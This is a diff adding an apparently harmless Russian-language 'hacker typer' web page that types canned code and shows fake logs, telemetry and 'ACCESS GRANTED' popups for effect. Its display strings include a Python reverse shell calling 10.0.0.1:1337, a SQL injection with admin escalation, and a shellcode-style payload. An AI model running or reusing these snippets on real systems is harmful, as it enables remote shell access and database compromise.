@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ULTRA_HACK // Fast Hollywood Cyber Terminal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap');
+
+        :root {
+            --primary: #00ff41;
+            --primary-glow: rgba(0, 255, 65, 0.3);
+            --bg-dark: #030703;
+            --panel-bg: rgba(6, 15, 8, 0.95);
+            --border-color: rgba(0, 255, 65, 0.3);
+            --text-muted: #008f11;
+        }
+
+        .theme-red {
+            --primary: #ff0033;
+            --primary-glow: rgba(255, 0, 51, 0.3);
+            --bg-dark: #080203;
+            --panel-bg: rgba(20, 5, 8, 0.95);
+            --border-color: rgba(255, 0, 51, 0.3);
+            --text-muted: #8f001b;
+        }
+
+        .theme-blue {
+            --primary: #00f0ff;
+            --primary-glow: rgba(0, 240, 255, 0.3);
+            --bg-dark: #020810;
+            --panel-bg: rgba(5, 18, 30, 0.95);
+            --border-color: rgba(0, 240, 255, 0.3);
+            --text-muted: #007285;
+        }
+
+        .theme-amber {
+            --primary: #ffaa00;
+            --primary-glow: rgba(255, 170, 0, 0.3);
+            --bg-dark: #0a0700;
+            --panel-bg: rgba(25, 18, 4, 0.95);
+            --border-color: rgba(255, 170, 0, 0.3);
+            --text-muted: #855800;
+        }
+
+        body {
+            background-color: var(--bg-dark);
+            color: var(--primary);
+            font-family: 'Fira Code', monospace;
+            overflow: hidden;
+            user-select: none;
+            /* Using hardware acceleration for rendering */
+            transform: translateZ(0);
+        }
+
+        /* Lightweight static scanline effect without heavy loops */
+        .scanlines {
+            position: fixed;
+            top: 0; left: 0; width: 100vw; height: 100vh;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%);
+            background-size: 100% 4px;
+            z-index: 50;
+            pointer-events: none;
+            opacity: 0.5;
+        }
+
+        .glow-text {
+            text-shadow: 0 0 5px var(--primary-glow);
+        }
+
+        .cyber-panel {
+            border: 1px solid var(--border-color);
+            background-color: var(--panel-bg);
+            position: relative;
+        }
+
+        .cyber-panel::before {
+            content: '';
+            position: absolute;
+            top: -1px; left: -1px;
+            width: 6px; height: 6px;
+            border-top: 2px solid var(--primary);
+            border-left: 2px solid var(--primary);
+        }
+
+        ::-webkit-scrollbar {
+            width: 4px;
+        }
+        ::-webkit-scrollbar-track {
+            background: rgba(0,0,0,0.8);
+        }
+        ::-webkit-scrollbar-thumb {
+            background: var(--text-muted);
+        }
+
+        @keyframes pulse-fast {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        .animate-pulse-fast {
+            animation: pulse-fast 0.8s infinite;
+        }
+    </style>
+</head>
+<body class="h-screen w-screen flex flex-col justify-between relative">
+
+    <div class="scanlines"></div>
+
+    <!-- Matrix Background Canvas -->
+    <canvas id="matrixCanvas" class="fixed top-0 left-0 w-full h-full -z-10 opacity-20 pointer-events-none"></canvas>
+
+    <!-- HEADER BAR -->
+    <header class="cyber-panel border-b p-2 flex justify-between items-center z-40 text-xs">
+        <div class="flex items-center space-x-2 sm:space-x-3">
+            <i class="fa-solid fa-biohazard text-lg animate-pulse-fast text-red-500"></i>
+            <span class="font-bold tracking-widest text-xs sm:text-sm glow-text">CYBER_SYS // LOW_SPEC_EDITION</span>
+            <span class="hidden lg:inline-block px-2 py-0.5 bg-red-900/40 text-red-400 border border-red-500/40 text-[10px]">TURBO FPS</span>
+        </div>
+
+        <div class="flex items-center space-x-1.5 sm:space-x-3">
+            <!-- LOW SPEC / TURBO MODE SWITCH -->
+            <button id="turboBtn" onclick="toggleTurboMode()" class="px-2.5 py-1 bg-yellow-900/30 border border-yellow-500/60 rounded font-bold hover:bg-yellow-500/30 transition flex items-center gap-1.5 text-yellow-400 text-[11px]">
+                <i class="fa-solid fa-bolt"></i>
+                <span id="turboText">МАТРИЦА: Вкл</span>
+            </button>
+
+            <!-- AUTO HACK TOGGLE BUTTON -->
+            <button id="autoHackBtn" onclick="toggleAutoHack()" class="px-2.5 py-1 border border-current rounded font-bold hover:bg-green-500/20 transition flex items-center gap-1.5 text-[11px]">
+                <i class="fa-solid fa-robot"></i>
+                <span id="autoHackText">АВТО-ВЗЛОМ: ВЫКЛ</span>
+            </button>
+
+            <!-- FULLSCREEN BUTTON -->
+            <button onclick="toggleFullscreen()" class="px-2.5 py-1 bg-green-900/30 border border-current rounded font-bold hover:bg-green-500/30 transition flex items-center gap-1.5 glow-text text-[11px]">
+                <i class="fa-solid fa-expand"></i>
+                <span class="hidden md:inline">НА ВЕСЬ ЭКРАН (F11)</span>
+            </button>
+
+            <!-- SOUND TOGGLE -->
+            <button id="soundBtn" onclick="toggleSound()" class="px-2 py-1 border border-current rounded hover:bg-green-500/20 text-[11px]">
+                <i class="fa-solid fa-volume-high" id="soundIcon"></i>
+            </button>
+
+            <!-- THEME SWITCHER -->
+            <select id="themeSelect" onchange="changeTheme(this.value)" class="bg-black border border-current rounded px-1.5 py-1 text-[11px] focus:outline-none cursor-pointer">
+                <option value="matrix">МАТРИЦА</option>
+                <option value="red">КРАСНЫЙ</option>
+                <option value="blue">СИНИЙ</option>
+                <option value="amber">ЯНТАРНЫЙ</option>
+            </select>
+        </div>
+    </header>
+
+    <!-- MAIN DASHBOARD GRID -->
+    <main class="flex-1 grid grid-cols-12 gap-2 p-2 z-20 overflow-hidden">
+        
+        <!-- LEFT COLUMN: SYSTEM MONITORING (3 Cols) -->
+        <section class="col-span-12 md:col-span-3 flex flex-col gap-2 overflow-hidden">
+            
+            <!-- MAP DISPLAY -->
+            <div class="cyber-panel p-2 flex flex-col h-40 relative overflow-hidden">
+                <div class="flex justify-between items-center border-b border-current/30 pb-1 mb-1 text-[11px]">
+                    <span class="font-bold flex items-center gap-1"><i class="fa-solid fa-globe"></i> TARGET_PROXY_MAP</span>
+                    <span class="text-green-400 text-[9px] animate-pulse">NODES: 32</span>
+                </div>
+                
+                <div class="flex-1 bg-black/80 relative flex items-center justify-center border border-current/20 rounded overflow-hidden">
+                    <svg class="w-full h-full opacity-40 stroke-current" viewBox="0 0 100 50" fill="none">
+                        <path d="M10,12 Q15,5 25,15 T40,10 T60,20 T80,10 T95,25" stroke="currentColor" stroke-width="0.5"/>
+                        <path d="M5,30 Q20,25 35,35 T65,30 T85,40" stroke="currentColor" stroke-width="0.5"/>
+                        <circle cx="20" cy="15" r="1.5" fill="#00ff41"/>
+                        <circle cx="45" cy="22" r="1.5" fill="#ff0033"/>
+                        <circle cx="75" cy="18" r="1.5" fill="#00f0ff"/>
+                        <line x1="20" y1="15" x2="45" y2="22" stroke="currentColor" stroke-width="0.4" stroke-dasharray="1"/>
+                        <line x1="45" y1="22" x2="75" y2="18" stroke="currentColor" stroke-width="0.4" stroke-dasharray="1"/>
+                    </svg>
+                    <div class="absolute bottom-1 left-2 text-[9px] font-mono text-gray-400">
+                        TARGET: PENTAGON_NODE // 104.28.14.88
+                    </div>
+                </div>
+            </div>
+
+            <!-- TELEMETRY -->
+            <div class="cyber-panel p-2 flex-1 flex flex-col justify-between text-xs space-y-2">
+                <div class="border-b border-current/30 pb-1 font-bold flex justify-between items-center">
+                    <span><i class="fa-solid fa-microchip"></i> SYSTEM_LOAD</span>
+                    <span class="text-[10px] text-gray-400">FPS: <span id="fpsCounter" class="text-green-400 font-bold">60</span></span>
+                </div>
+
+                <div class="space-y-2 text-[11px]">
+                    <div>
+                        <div class="flex justify-between text-[10px] mb-0.5">
+                            <span>CPU CORES:</span>
+                            <span id="cpuVal">45%</span>
+                        </div>
+                        <div class="w-full bg-black h-1.5 rounded overflow-hidden border border-current/30">
+                            <div id="cpuBar" class="bg-current h-full" style="width: 45%"></div>
+                        </div>
+                    </div>
+
+                    <div>
+                        <div class="flex justify-between text-[10px] mb-0.5">
+                            <span>RAM MEMORY:</span>
+                            <span id="ramVal">12.4 / 32 GB</span>
+                        </div>
+                        <div class="w-full bg-black h-1.5 rounded overflow-hidden border border-current/30">
+                            <div id="ramBar" class="bg-current h-full" style="width: 40%"></div>
+                        </div>
+                    </div>
+
+                    <div>
+                        <div class="flex justify-between text-[10px] mb-0.5">
+                            <span>GPU KERNEL:</span>
+                            <span id="gpuVal">62%</span>
+                        </div>
+                        <div class="w-full bg-black h-1.5 rounded overflow-hidden border border-current/30">
+                            <div id="gpuBar" class="bg-current h-full" style="width: 62%"></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Action Buttons -->
+                <div class="grid grid-cols-2 gap-1 pt-1 border-t border-current/20 text-[10px]">
+                    <button onclick="triggerAlert('BREACH')" class="border border-current p-1.5 rounded text-center hover:bg-green-500/20 font-bold">
+                        <i class="fa-solid fa-skull"></i> DDOS_ATTACK
+                    </button>
+                    <button onclick="triggerAlert('DECRYPT')" class="border border-current p-1.5 rounded text-center hover:bg-green-500/20 font-bold">
+                        <i class="fa-solid fa-key"></i> DECRYPT_DB
+                    </button>
+                    <button onclick="triggerAlert('ACCESS')" class="border border-green-400 p-1.5 rounded text-center hover:bg-green-500/20 font-bold col-span-2">
+                        <i class="fa-solid fa-unlock"></i> FORCE ACCESS GRANTED
+                    </button>
+                </div>
+            </div>
+
+        </section>
+
+        <!-- CENTER COLUMN: MAIN TERMINAL (6 Cols) -->
+        <section class="col-span-12 md:col-span-6 flex flex-col cyber-panel overflow-hidden relative">
+            
+            <div class="bg-black/90 px-3 py-1.5 border-b border-current/30 flex justify-between items-center text-xs">
+                <div class="flex items-center space-x-2">
+                    <span class="w-2.5 h-2.5 rounded-full bg-red-500 inline-block"></span>
+                    <span class="w-2.5 h-2.5 rounded-full bg-yellow-500 inline-block"></span>
+                    <span class="w-2.5 h-2.5 rounded-full bg-green-500 inline-block"></span>
+                    <span class="ml-2 font-bold tracking-wider">bash - root@cyber-core:~#</span>
+                </div>
+                <span class="text-[10px] text-gray-400">НАЖИМАЙТЕ КЛАВИШИ!</span>
+            </div>
+
+            <!-- Terminal Output Area -->
+            <div id="terminal" class="flex-1 p-3 overflow-y-auto font-mono text-xs sm:text-sm leading-relaxed space-y-0.5">
+                <div class="text-gray-400">// ИНИЦИАЛИЗАЦИЯ БЫСТРОЙ ВЕРСИИ СИМУЛЯТОРА...</div>
+                <div class="text-gray-400">// Нажимайте ЛЮБЫЕ клавиши на клавиатуре или включите "АВТО-ВЗЛОМ".</div>
+                <div id="codeLines"></div>
+                <div class="pt-1 inline-block"><span class="text-green-400 font-bold">root@cyber-core:~#</span> <span id="activeLine" class="border-r-2 border-current animate-pulse"></span></div>
+            </div>
+
+            <!-- Interactive Command Prompt -->
+            <div class="p-2 bg-black border-t border-current/30 flex items-center space-x-2 text-xs">
+                <span class="font-bold text-green-400">&gt;</span>
+                <input type="text" id="cmdInput" onkeydown="handleCmd(event)" placeholder="Введите команду (help, breach, decrypt, access, clear)..." class="flex-1 bg-transparent border-none text-xs focus:outline-none px-2 py-0.5 text-current">
+                <button onclick="execCmd()" class="px-3 py-1 border border-current rounded hover:bg-green-500/20 font-bold text-[10px]">ВЫПОЛНИТЬ</button>
+            </div>
+        </section>
+
+        <!-- RIGHT COLUMN: HEX DUMPER & LOGS (3 Cols) -->
+        <section class="col-span-12 md:col-span-3 flex flex-col gap-2 overflow-hidden">
+            
+            <div class="cyber-panel p-2 flex-1 flex flex-col overflow-hidden text-[10px] font-mono">
+                <div class="border-b border-current/30 pb-1 mb-1 font-bold flex justify-between items-center text-xs">
+                    <span><i class="fa-solid fa-memory"></i> HEX_DUMP</span>
+                    <span class="text-[9px] text-red-400">RAM</span>
+                </div>
+                <div id="hexViewer" class="flex-1 overflow-hidden space-y-0.5 text-gray-400 leading-tight">
+                </div>
+            </div>
+
+            <div class="cyber-panel p-2 h-44 flex flex-col overflow-hidden text-[10px]">
+                <div class="border-b border-current/30 pb-1 mb-1 font-bold flex justify-between items-center text-xs">
+                    <span><i class="fa-solid fa-list-check"></i> LOGS</span>
+                    <span class="text-green-400 text-[9px]">LIVE</span>
+                </div>
+                <div id="attackLogs" class="flex-1 overflow-y-auto space-y-1 font-mono text-[10px]">
+                    <div class="text-green-400">[+] Port 8080 open. Injecting buffer...</div>
+                    <div class="text-yellow-400">[!] Firewall alert bypassed via node 07.</div>
+                </div>
+            </div>
+
+        </section>
+
+    </main>
+
+    <!-- MODAL POPUPS -->
+    <div id="modalOverlay" class="fixed inset-0 bg-black/85 z-50 flex items-center justify-center hidden opacity-0 transition-opacity duration-200">
+        <div id="modalBox" class="cyber-panel p-6 sm:p-8 rounded max-w-lg w-full text-center space-y-4 transform scale-95 transition-transform duration-200">
+            <i id="modalIcon" class="fa-solid fa-shield-halved text-6xl"></i>
+            <h2 id="modalTitle" class="text-2xl sm:text-3xl font-extrabold tracking-widest uppercase">ACCESS GRANTED</h2>
+            <p id="modalMsg" class="text-xs sm:text-sm leading-relaxed text-gray-300 font-mono">Все уровни защиты успешно взломаны.</p>
+            
+            <button onclick="closeModal()" class="px-6 py-2 border border-current rounded font-bold hover:bg-white/10 uppercase tracking-widest text-xs transition">
+                ПРОДОЛЖИТЬ [ESC]
+            </button>
+        </div>
+    </div>
+
+    <script>
+        const codeDatabase = [
+            `// INJECTING MEMORY BUFFER OVERFLOW PAYLOAD\n#include <sys/socket.h>\n#include <netinet/in.h>\n\nvoid execute_exploit(char *target_ip) {\n    int sock = socket(AF_INET, SOCK_STREAM, 0);\n    struct sockaddr_in server;\n    server.sin_addr.s_addr = inet_addr(target_ip);\n    connect(sock, (struct sockaddr *)&server, sizeof(server));\n    char payload[256] = "\\x90\\x90\\x90\\x31\\xc0\\x50\\x68\\x2f";\n    write(sock, payload, sizeof(payload));\n}\n`,
+            `# PYTHON BACKDOOR LISTENER\nimport socket, subprocess, os\n\ndef remote_shell():\n    s = socket.socket()\n    s.connect(("10.0.0.1", 1337))\n    os.dup2(s.fileno(), 0)\n    subprocess.call(["/bin/sh", "-i"])\n\nif __name__ == "__main__":\n    remote_shell()\n`,
+            `/* KERNEL MEMORY DIRECT POINTER BYPASS */\ntypedef struct {\n    uint64_t cr3_register;\n    uint64_t kernel_base;\n} STEALTH_STRUCT;\n\nNTSTATUS BypassGuard(STEALTH_STRUCT *data) {\n    __writecr3(data->cr3_register);\n    return STATUS_SUCCESS;\n}\n`,
+            `-- SQL INJECTION & DATABASE DECRYPTION\nSELECT username, password_hash FROM user_vault \nWHERE access_level > 9 OR '1'='1';--\nUPDATE system_auth SET is_admin = TRUE WHERE id = 1;\n`
+        ];
+
+        let snippetIdx = 0;
+        let charIdx = 0;
+        let isAutoHack = false;
+        let autoHackInterval = null;
+        let soundEnabled = true;
+        let turboMode = false; // Fast mode state
+
+        const terminal = document.getElementById('terminal');
+        const codeLines = document.getElementById('codeLines');
+        const activeLine = document.getElementById('activeLine');
+        const MAX_DOM_LINES = 35; // Strict DOM limit for smooth performance on low-end CPUs
+
+        /* KEYBOARD HACKER TYPER LOGIC */
+        document.addEventListener('keydown', (e) => {
+            if (document.activeElement.id === 'cmdInput' || e.key === 'F11' || e.key === 'Escape') return;
+            typeCodeChunk(10);
+        });
+
+        function typeCodeChunk(charsCount) {
+            const currentCode = codeDatabase[snippetIdx];
+
+            for (let i = 0; i < charsCount; i++) {
+                if (charIdx < currentCode.length) {
+                    const char = currentCode.charAt(charIdx);
+                    if (char === '\n') {
+                        const div = document.createElement('div');
+                        div.innerHTML = activeLine.innerHTML;
+                        codeLines.appendChild(div);
+                        activeLine.innerHTML = '';
+
+                        // DOM Cleanup to maintain maximum speed on weak computers
+                        if (codeLines.children.length > MAX_DOM_LINES) {
+                            codeLines.removeChild(codeLines.firstChild);
+                        }
+                    } else {
+                        activeLine.innerHTML += escapeHtml(char);
+                    }
+                    charIdx++;
+                } else {
+                    charIdx = 0;
+                    snippetIdx = (snippetIdx + 1) % codeDatabase.length;
+                }
+            }
+
+            playKeySound();
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+
+        function escapeHtml(str) {
+            return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/ /g, "&nbsp;");
+        }
+
+        /* AUTO HACK MODE */
+        function toggleAutoHack() {
+            isAutoHack = !isAutoHack;
+            const btnText = document.getElementById('autoHackText');
+            
+            if (isAutoHack) {
+                btnText.innerText = 'АВТО-ВЗЛОМ: ВКЛ';
+                autoHackInterval = setInterval(() => {
+                    typeCodeChunk(6);
+                }, 50);
+            } else {
+                btnText.innerText = 'АВТО-ВЗЛОМ: ВЫКЛ';
+                clearInterval(autoHackInterval);
+            }
+        }
+
+        /* TURBO LOW-SPEC MODE TOGGLE */
+        function toggleTurboMode() {
+            turboMode = !turboMode;
+            const btn = document.getElementById('turboBtn');
+            const btnText = document.getElementById('turboText');
+            
+            if (turboMode) {
+                btnText.innerText = 'МАТРИЦА: Выкл (TURBO)';
+                btn.className = 'px-2.5 py-1 bg-green-900/40 border border-green-500 rounded font-bold transition flex items-center gap-1.5 text-green-400 text-[11px]';
+            } else {
+                btnText.innerText = 'МАТРИЦА: Вкл';
+                btn.className = 'px-2.5 py-1 bg-yellow-900/30 border border-yellow-500/60 rounded font-bold transition flex items-center gap-1.5 text-yellow-400 text-[11px]';
+            }
+        }
+
+        /* AUDIO SYNTHESIZER FOR CLICK SOUNDS */
+        let audioCtx = null;
+        function playKeySound() {
+            if (!soundEnabled) return;
+            try {
+                if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.type = 'sine';
+                osc.frequency.value = 300 + Math.random() * 400;
+                gain.gain.setValueAtTime(0.015, audioCtx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.00001, audioCtx.currentTime + 0.025);
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                osc.start();
+                osc.stop(audioCtx.currentTime + 0.025);
+            } catch (e) {}
+        }
+
+        function toggleSound() {
+            soundEnabled = !soundEnabled;
+            const icon = document.getElementById('soundIcon');
+            icon.className = soundEnabled ? 'fa-solid fa-volume-high' : 'fa-solid fa-volume-xmark';
+        }
+
+        /* LIGHTWEIGHT HEX DUMP */
+        function generateHexDump() {
+            const hexViewer = document.getElementById('hexViewer');
+            let content = '';
+            for (let i = 0; i < 10; i++) {
+                const addr = '0x' + (0x7FFF0000 + i * 16).toString(16).toUpperCase();
+                let hexBytes = '';
+                for (let j = 0; j < 6; j++) {
+                    hexBytes += Math.floor(Math.random() * 256).toString(16).padStart(2, '0').toUpperCase() + ' ';
+                }
+                content += `<div class="flex justify-between"><span class="opacity-60">${addr}</span> <span>${hexBytes}</span></div>`;
+            }
+            hexViewer.innerHTML = content;
+        }
+        setInterval(generateHexDump, 400);
+
+        /* LIGHTWEIGHT LOG GENERATOR */
+        const attackLogMessages = [
+            "[+] Bypass proxy node #12 -> Redirecting IP",
+            "[!] Intrusion detection system bypassed",
+            "[#] Decrypting 2048-bit AES key",
+            "[+] Root access granted on sub-node 192.168.0.4"
+        ];
+        function pushAttackLog() {
+            const container = document.getElementById('attackLogs');
+            const msg = attackLogMessages[Math.floor(Math.random() * attackLogMessages.length)];
+            const time = new Date().toTimeString().split(' ')[0];
+            const div = document.createElement('div');
+            div.innerText = `${time} ${msg}`;
+            container.appendChild(div);
+            if (container.children.length > 10) container.removeChild(container.firstChild);
+            container.scrollTop = container.scrollHeight;
+        }
+        setInterval(pushAttackLog, 1800);
+
+        /* COMMAND PROMPT HANDLER */
+        function handleCmd(e) {
+            if (e.key === 'Enter') execCmd();
+        }
+        function execCmd() {
+            const input = document.getElementById('cmdInput');
+            const val = input.value.trim().toLowerCase();
+            if (!val) return;
+
+            const div = document.createElement('div');
+            div.className = 'text-yellow-400 font-bold';
+            div.innerText = 'root@cyber-core:~# ' + input.value;
+            codeLines.appendChild(div);
+            input.value = '';
+
+            if (val === 'help') {
+                addLog('Доступные команды: help, breach, decrypt, access, clear');
+            } else if (val === 'breach') {
+                triggerAlert('BREACH');
+            } else if (val === 'decrypt') {
+                triggerAlert('DECRYPT');
+            } else if (val === 'access') {
+                triggerAlert('ACCESS');
+            } else if (val === 'clear') {
+                codeLines.innerHTML = '';
+            } else {
+                addLog(`[ОШИБКА]: Команда '${val}' не найдена.`);
+            }
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+
+        function addLog(msg) {
+            const div = document.createElement('div');
+            div.className = 'text-gray-300';
+            div.innerText = msg;
+            codeLines.appendChild(div);
+        }
+
+        /* MODALS */
+        function triggerAlert(type) {
+            const overlay = document.getElementById('modalOverlay');
+            const box = document.getElementById('modalBox');
+            const title = document.getElementById('modalTitle');
+            const msg = document.getElementById('modalMsg');
+            const icon = document.getElementById('modalIcon');
+
+            overlay.classList.remove('hidden');
+            setTimeout(() => {
+                overlay.classList.remove('opacity-0');
+                box.classList.remove('scale-95');
+            }, 10);
+
+            if (type === 'ACCESS') {
+                title.innerText = 'ACCESS GRANTED';
+                msg.innerText = 'ПОЛНЫЙ ROOT ДОСТУП ПОЛУЧЕН. Защита сервера успешно отключена.';
+                icon.className = 'fa-solid fa-lock-open text-6xl text-green-400';
+            } else if (type === 'BREACH') {
+                title.innerText = 'SYSTEM OVERRIDE';
+                msg.innerText = 'Перегрузка сервера завершена. Шлюзы заблокированы.';
+                icon.className = 'fa-solid fa-shield-virus text-6xl text-red-500';
+            } else if (type === 'DECRYPT') {
+                title.innerText = 'DATABASE DECRYPTED';
+                msg.innerText = 'База данных успешно расшифрована.';
+                icon.className = 'fa-solid fa-database text-6xl text-blue-400';
+            }
+        }
+
+        function closeModal() {
+            const overlay = document.getElementById('modalOverlay');
+            const box = document.getElementById('modalBox');
+            overlay.classList.add('opacity-0');
+            box.classList.add('scale-95');
+            setTimeout(() => overlay.classList.add('hidden'), 200);
+        }
+
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') closeModal();
+        });
+
+        function toggleFullscreen() {
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen().catch(() => {});
+            } else {
+                if (document.exitFullscreen) document.exitFullscreen();
+            }
+        }
+
+        function changeTheme(theme) {
+            document.body.className = theme === 'matrix' ? '' : `theme-${theme}`;
+        }
+
+        /* OPTIMIZED MATRIX CANVAS (30 FPS max / Pausable in Turbo Mode) */
+        const canvas = document.getElementById('matrixCanvas');
+        const ctx = canvas.getContext('2d');
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+        resizeCanvas();
+        window.addEventListener('resize', resizeCanvas);
+
+        const matrixChars = '0123456789ABCDEF';
+        const fontSize = 14;
+        let drops = Array(Math.floor(canvas.width / fontSize)).fill(1);
+
+        let lastDrawTime = 0;
+        function drawMatrix(timestamp) {
+            requestAnimationFrame(drawMatrix);
+
+            // FPS Counter calculation
+            if (timestamp - lastDrawTime < 35) return; // Cap at ~28-30 FPS for extreme CPU saving
+            
+            if (turboMode) {
+                ctx.clearRect(0, 0, canvas.width, canvas.height);
+                return; // Stop rendering matrix when Turbo Mode is active
+            }
+
+            lastDrawTime = timestamp;
+
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.12)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = getComputedStyle(document.body).getPropertyValue('--primary').trim() || '#00ff41';
+            ctx.font = fontSize + 'px monospace';
+
+            for (let i = 0; i < drops.length; i += 2) { // Step by 2 to reduce render overhead
+                const text = matrixChars.charAt(Math.floor(Math.random() * matrixChars.length));
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            }
+        }
+        requestAnimationFrame(drawMatrix);
+
+        /* TELEMETRY UPDATER */
+        setInterval(() => {
+            const cpu = Math.floor(30 + Math.random() * 40);
+            const gpu = Math.floor(40 + Math.random() * 30);
+            document.getElementById('cpuVal').innerText = cpu + '%';
+            document.getElementById('cpuBar').style.width = cpu + '%';
+            document.getElementById('gpuVal').innerText = gpu + '%';
+            document.getElementById('gpuBar').style.width = gpu + '%';
+            document.getElementById('fpsCounter').innerText = turboMode ? '60+' : '30-60';
+        }, 2000);
+    </script>
+</body>
+</html>
